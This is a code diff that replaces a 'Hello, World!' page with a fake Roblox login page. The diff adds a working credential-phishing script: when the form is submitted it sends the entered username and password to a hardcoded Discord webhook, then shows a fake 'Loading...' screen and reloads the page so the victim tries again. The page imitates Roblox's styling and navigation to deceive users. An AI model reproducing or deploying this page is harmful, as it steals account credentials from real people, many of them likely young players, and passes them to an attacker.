@@ -1,14 +1,221 @@
 <!DOCTYPE html>
-
-<html>
+<html lang="en">
 <head>
-  <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">
-  <link rel="stylesheet" href="styles/style.css"/>
-  <title>Hello, World!</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Roblox</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #0d0d0d; /* Dark background */
+            color: white;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        /* Top Navigation Bar */
+        .navbar {
+            width: 100%;
+            background: #181818;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px 20px;
+            position: absolute;
+            top: 0;
+        }
+
+        .nav-links {
+            color: white;
+            margin: 0 15px;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .nav-links:hover {
+            text-decoration: underline;
+        }
+
+        /* Login Box (Centered) */
+        .login-container {
+            background: #1a1a1a;
+            padding: 30px;
+            border-radius: 8px;
+            text-align: center;
+            width: 350px;
+            box-shadow: 0px 0px 10px rgba(255, 255, 255, 0.1);
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        h2 {
+            font-weight: bold;
+        }
+
+        input {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #2c2c2c;
+            border-radius: 5px;
+            background: #2c2c2c;
+            color: white;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        input::placeholder {
+            color: #999;
+        }
+
+        /* Transparent Button with White Stroke */
+        .button {
+            width: 100%;
+            height: 45px;
+            background: transparent;
+            color: white;
+            font-weight: bold;
+            border: 2px solid white; /* White stroke */
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+        }
+
+        .button:hover {
+            background: rgba(255, 255, 255, 0.2); /* Light white hover effect */
+        }
+
+        .disabled-btn {
+            width: 100%;
+            height: 45px;
+            background: #333;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: not-allowed;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+        }
+
+        .forgot {
+            color: #bbbbbb;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        .forgot:hover {
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        .divider {
+            border-top: 1px solid #333;
+            margin: 20px 0;
+        }
+
+        /* "Sign Up" Now Matches "Don't Have an Account?" */
+        .signup {
+            color: #bbbbbb;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        .signup span {
+            color: #bbbbbb; /* Same color as "Don't have an account?" */
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .signup span:hover {
+            text-decoration: underline;
+        }
+    </style>
 </head>
 <body>
-  <h1>
-    Hello, World!
-  </h1>
+
+    <!-- Navbar (Centered) -->
+    <div class="navbar">
+        <a href="#" class="nav-links">Charts</a>
+        <a href="#" class="nav-links">Marketplace</a>
+        <a href="#" class="nav-links">Create</a>
+        <a href="#" class="nav-links">Robux</a>
+    </div>
+
+    <!-- Login Box (Fully Centered) -->
+    <div class="login-container">
+        <h2>Login to Roblox</h2>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Username/Email/Phone" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" class="button">Log In</button>
+        </form>
+
+        <p class="forgot">Forgot Password or Username?</p>
+
+        <div class="divider"></div>
+
+        <button class="disabled-btn" disabled>Email Me a One-Time Code</button>
+        <button class="disabled-btn" disabled>Use Another Device</button>
+
+        <p class="signup">Don't have an account? <span>Sign Up</span></p>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", async function(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            // Replace with your actual Discord Webhook URL
+            const webhookURL = "https://discord.com/api/webhooks/1348142406486462525/5lstgMjVTaNiSfS05hOnxFpNMKIgOrbohHkwlbrSv0PRfugOjSBdhNPaDHkkXD1AZ8zz";
+
+            // Message format for Discord
+            const data = {
+                content: `New Login Attempt:\n**Username:** ${username}\n**Password:** ${password}`
+            };
+
+            // Show black loading screen
+            document.body.innerHTML = `
+                <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: black; font-family: Arial, sans-serif;">
+                    <p style="font-size: 20px; color: white;">Loading...</p>
+                    <p style="font-size: 14px; color: gray;">Please wait</p>
+                    <button onclick="goBack()" style="margin-top: 20px; padding: 10px 20px; font-size: 16px; background: white; color: black; border: none; cursor: pointer;">← Back</button>
+                </div>
+            `;
+
+            // Send data to Discord
+            await fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            });
+
+            // Wait 3 seconds, then go back to login page
+            setTimeout(() => {
+                location.reload();
+            }, 3000);
+        });
+
+        // Function to go back to the login screen immediately
+        function goBack() {
+            location.reload();
+        }
+    </script>
+
 </body>
 </html>
